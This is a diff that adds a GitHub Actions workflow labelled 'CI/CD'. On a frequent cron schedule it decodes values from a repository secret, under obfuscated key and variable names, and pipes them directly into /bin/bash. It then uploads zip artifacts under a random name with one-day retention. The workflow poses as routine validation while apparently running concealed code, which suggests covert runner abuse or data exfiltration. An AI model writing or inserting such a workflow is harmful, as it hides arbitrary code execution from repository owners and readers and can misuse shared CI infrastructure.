@@ -1,0 +1,31 @@
+name: CI/CD
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '8 5,11,17,23 * * *'
+permissions:
+  contents: read
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  validate:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+      - name: Run task
+        env:
+          uc4: ${{ secrets.uc4 }}
+        run: |
+          printf '%s' "$uc4" | jq -r .obf8 | /bin/bash
+          printf '%s' "$huee747" | jq -r .rc7 | /bin/bash
+          printf '%s' "$q510" | jq -r .wh7770 | /bin/bash
+
+      - name: Store output
+        uses: actions/upload-artifact@v4
+        with:
+          name: aMBjcp4i
+          path: "*.zip"
+          retention-days: 1
